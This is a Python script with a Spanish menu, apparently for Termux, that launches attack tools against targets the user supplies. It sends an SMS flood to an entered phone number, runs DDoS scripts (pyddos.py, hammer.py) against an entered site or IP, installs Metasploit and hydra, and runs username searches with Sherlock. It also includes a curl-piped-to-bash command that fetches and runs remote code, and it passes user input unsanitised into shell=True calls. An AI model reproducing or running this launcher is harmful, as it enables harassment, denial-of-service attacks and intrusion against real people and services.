import shlex, subprocess
import time
command_line = ' apt-get install git vim nano clang nmap wget weechat unzip termux-api screenfetch unstable-repo root-repo python bash curl neofetch hydra gzip game-repo fish figlet dpkg dos2unix apt apache2 dnsutils tsu -y'
args = shlex.split(command_line)

command_line3 = ' pkg uninstall ruby -y'
args3 = shlex.split(command_line3)

command_line4 = ' bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2'
args4 = shlex.split(command_line4)

# Imprimimos el menú en pantalla
subprocess.call(['clear'],shell=True)
print("\033[31m")
print("""
▀█▀ ▄▀▀▄ ▄▀▀▄  █░░   █░█ ▀█▀ ▀█▀
░█░ █░░█ █░░█  █░░   █▀▄ ░█░ ░█░
░▀░ ░▀▀░ ░▀▀░░ ▀▀▀   ▀░▀ ▀▀▀ ░▀░
        """)
print("Codded by; @Jm")
print("\033[39m")
print("""
    1) Instalador de paquetes      4) Ataques DDoS(No root)
    2) Herramientas de spam        5) Metasploit
    3) Ataques DDoS(root)          6) Sherlock(Buscador de usuarios)
    """)

# Leemos lo que ingresa el usuario
eligio=input("-Selecciona la herramienta: ")

# Según lo que ingresó, código diferente
if eligio=="1":
    subprocess.call(['clear'],shell=True)
    print("Instalando...")
    subprocess.call(args)

elif eligio=="2":
    subprocess.call(['clear'],shell=True)
    print("""

    ▄▀▀ █▀▄ ▄▀▄ ██▄██
    ░▀▄ █▀░ █▄█ █░▀░█
    ▀▀░ ▀░░ ▀░▀ ▀░░░▀

    """)
    numero = input("Introduce el número de telefono(Ej: 34920123987): ")
    subprocess.call(['pip install -r requirements.txt'],shell=True)
    subprocess.call(['python quack --target ' + numero + ' --tool SMS --timeout 3600 --threads 50'],shell=True)

elif eligio=="3":
    subprocess.call(['clear'],shell=True)
    print("\033[35m")
    print("""
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
(ROOT)            """)
    print("\033[39m")
    subprocess.call(['cd', 'herramientas'],shell=True)
    enlace = input("\nIntroduce el enlace (Sin Http/https): ")
    command_line2 = 'python pyddos.py -d' + enlace + '-p 80 -T 5000 -Pyslow'
    args2 = shlex.split(command_line2)
    subprocess.call(args2)

elif eligio=="4":
    subprocess.call(['clear'],shell=True)
    print("\033[36m")
    print("""
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗        
██████╔╝██████╔╝╚█████╔╝██████╔╝                                                 ╚═════╝░╚═════╝░░╚════╝░╚═════╝░

""")
    print("\033[39m")
    subprocess.call(['cd', 'herramientas'],shell=True)
    IP = input("Introduce la IP: ")
    command_line5 = 'python hammer.py -s' + IP + ' -p 80 -t 135'
    args5 = shlex.split(command_line5)
    subprocess.call(args5)
elif eligio=="5":
    print("""\n
    1) Error de ruby (Metasploit)     3) Aprender a utilizar Metasploit
    2) Instalar Metasploit
    """)
    opcion=input("Selecciona el error: ")
    
    if opcion=="1":
        subprocess.call(['clear'],shell=True)
        time.sleep(2)
        print("[                 ]0%")
        time.sleep(1)
        print("[====             ]25%")
        time.sleep(2)
        print("[========         ]50%")
        time.sleep(3)
        print("[============     ]75%")
        time.sleep(1)
        print("Sucess!!!")
        subprocess.call(args3)
        print(''''\n \nIntroduce este comando: bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2 \n''')

    elif opcion=="2":
        subprocess.call(['clear'],shell=True)
        subprocess.call(['pkg install unstable-repo -y'],shell=True)
        subprocess.call(['pkg install metasploit -y'],shell=True)
    elif opcion=="3":
        subprocess.call(['termux-open https://academia-hacker.com/metasploit-framework/'],shell=True)
    else:
        print("Opción no válida")
elif eligio=="6":
    print("""

    ▄▀▀ █░█ █▀▀ █▀▄ █░░ ▄▀▀▄ ▄▀▀ █░█
    ░▀▄ █▀█ █▀▀ █▀▄ █░░ █░░█ █░░ █▀▄
    ▀▀░ ▀░▀ ▀▀▀ ▀░▀ ▀▀▀ ░▀▀░ ░▀▀ ▀░▀
    """)
    nombre = input("Introduce el nombre: ")
    subprocess.call(['clear'],shell=True)
    subprocess.call(['python sherlock.py ' + nombre],shell=True)
else:
    print("Opción no válida")


